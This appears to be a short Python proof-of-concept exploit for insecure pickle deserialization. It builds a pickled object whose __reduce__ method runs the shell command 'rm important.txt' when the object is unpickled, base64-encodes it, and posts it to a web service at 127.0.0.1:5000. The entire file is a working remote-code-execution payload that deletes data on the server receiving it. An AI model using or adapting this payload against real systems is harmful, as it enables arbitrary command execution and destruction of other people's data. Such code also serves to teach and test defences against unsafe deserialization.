import base64
import pickle
import subprocess

import requests as requests


class DeleteImportant:
    # Function that gets called by pickle.loads
    def __reduce__(self):
        # We assume the target file already exists in the server
        return subprocess.Popen, (("rm", "important.txt",),)


if __name__ == "__main__":
    data = pickle.dumps(DeleteImportant())

    string_data = str(base64.b64encode(data))
    string_data = string_data.strip("b").strip("'")
    # Do the actual request
    requests.post("http://127.0.0.1:5000/", json={"data": string_data})
